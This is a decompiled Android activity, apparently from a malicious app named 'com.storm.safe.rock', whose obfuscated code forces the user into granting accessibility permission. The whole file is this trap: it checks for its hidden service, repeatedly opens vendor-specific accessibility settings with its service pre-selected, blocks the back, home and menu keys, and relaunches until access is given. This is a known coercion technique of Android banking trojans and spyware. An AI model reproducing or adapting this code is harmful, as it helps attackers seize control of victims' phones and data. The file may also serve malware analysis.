package com.storm.safe.rock.activity;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.ResolveInfo;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityManager;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import kotlin.Pair;
import kotlin.collections.EmptyList;
import kotlin.text.AbstractC0779a1;
import p000.AbstractC1120qr;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class AccessibilityTrampoline extends Activity {

    /* renamed from: a0 */
    public static AccessibilityTrampoline f51911a0;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.activity.AccessibilityTrampoline$a0 */
    public static final class C0242a0 {
        public /* synthetic */ C0242a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        public final boolean isActivityOpen() {
            return AccessibilityTrampoline.f51911a0 != null;
        }

        private C0242a0() {
        }
    }

    static {
        new C0242a0(null);
    }

    /* renamed from: a0 */
    public static void m211180a0(Intent intent, String str) {
        Bundle bundle = new Bundle();
        bundle.putString(":settings:fragment_args_key", str);
        intent.putExtra(":settings:fragment_args_key", str);
        intent.putExtra(":settings:show_fragment_args", bundle);
    }

    /* renamed from: a1 */
    public final boolean m211181a1() {
        ServiceInfo serviceInfo;
        try {
            Object systemService = getSystemService("accessibility");
            AccessibilityManager accessibilityManager = systemService instanceof AccessibilityManager ? (AccessibilityManager) systemService : null;
            if (accessibilityManager != null) {
                List<AccessibilityServiceInfo> enabledAccessibilityServiceList = accessibilityManager.getEnabledAccessibilityServiceList(-1);
                if (enabledAccessibilityServiceList == null) {
                    enabledAccessibilityServiceList = EmptyList.f57568a0;
                }
                if (enabledAccessibilityServiceList == null || !enabledAccessibilityServiceList.isEmpty()) {
                    Iterator<T> it = enabledAccessibilityServiceList.iterator();
                    while (it.hasNext()) {
                        ResolveInfo resolveInfo = ((AccessibilityServiceInfo) it.next()).getResolveInfo();
                        if (t60.m214686a2((resolveInfo == null || (serviceInfo = resolveInfo.serviceInfo) == null) ? null : serviceInfo.packageName, getPackageName())) {
                            break;
                        }
                    }
                }
                String string = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services");
                if (string != null) {
                    String strFlattenToString = new ComponentName(this, (Class<?>) dqtvuisjd.class).flattenToString();
                    t60.m214694b5(strFlattenToString, "ComponentName(this, svcClass).flattenToString()");
                    List<String> listM213676c9 = AbstractC0779a1.m213676c9(string, new char[]{':'});
                    if (!listM213676c9.isEmpty()) {
                        for (String str : listM213676c9) {
                            if (!AbstractC0779a1.m213656a9(str, strFlattenToString)) {
                                if (AbstractC0779a1.m213656a9(str, getPackageName() + "/" + dqtvuisjd.class.getName())) {
                                }
                            }
                            return true;
                        }
                    }
                }
            }
        } catch (Exception unused) {
        }
        return false;
    }

    /* renamed from: a2 */
    public final void m211182a2() {
        String lowerCase;
        String name = dqtvuisjd.class.getName();
        String str = getPackageName() + "/" + name;
        String str2 = Build.BRAND;
        String lowerCase2 = "";
        if (str2 != null) {
            lowerCase = str2.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        } else {
            lowerCase = "";
        }
        String str3 = Build.MANUFACTURER;
        if (str3 != null) {
            lowerCase2 = str3.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        if (AbstractC0779a1.m213652a5(lowerCase, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase2, "vivo", false)) {
            Pair[] pairArr = {new Pair("com.vivo.settings", "com.vivo.settings.accessibility.AccessibilitySettingsActivity"), new Pair("com.android.settings", "com.android.settings.accessibility.AccessibilitySettingsActivity"), new Pair("com.vivo.settings", "com.vivo.settings.VivoSubSettingsForImmersive")};
            for (int i = 0; i < 3; i++) {
                Pair pair = pairArr[i];
                String str4 = (String) pair.f57556a0;
                String str5 = (String) pair.f57557a1;
                try {
                    Intent intent = new Intent();
                    intent.setClassName(str4, str5);
                    intent.setFlags(1350565888);
                    m211180a0(intent, str);
                    startActivity(intent);
                    return;
                } catch (Exception e) {
                    e.getMessage();
                }
            }
        }
        if (AbstractC0779a1.m213652a5(lowerCase, "samsung", false) || AbstractC0779a1.m213652a5(lowerCase2, "samsung", false)) {
            try {
                Intent intent2 = new Intent("com.samsung.accessibility.installed_service");
                intent2.setFlags(1350565888);
                m211180a0(intent2, str);
                startActivity(intent2);
                return;
            } catch (Exception e2) {
                e2.getMessage();
            }
        }
        try {
            Intent intent3 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            intent3.setFlags(1350565888);
            m211180a0(intent3, str);
            startActivity(intent3);
        } catch (Exception e3) {
            e3.getMessage();
            try {
                Intent intent4 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                intent4.setFlags(1350565888);
                startActivity(intent4);
            } catch (Exception e4) {
                e4.getMessage();
            }
        }
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        f51911a0 = this;
        if (m211181a1()) {
            finish();
        } else {
            m211182a2();
        }
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        f51911a0 = null;
        super.onDestroy();
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public final boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 3 || i == 4 || i == 82;
    }

    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
        if (!m211181a1()) {
            m211182a2();
            return;
        }
        try {
            Intent intent = new Intent(this, (Class<?>) iuzxujjtqev.class);
            intent.addFlags(335544320);
            startActivity(intent);
        } catch (Exception unused) {
        }
        finish();
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
    }
}
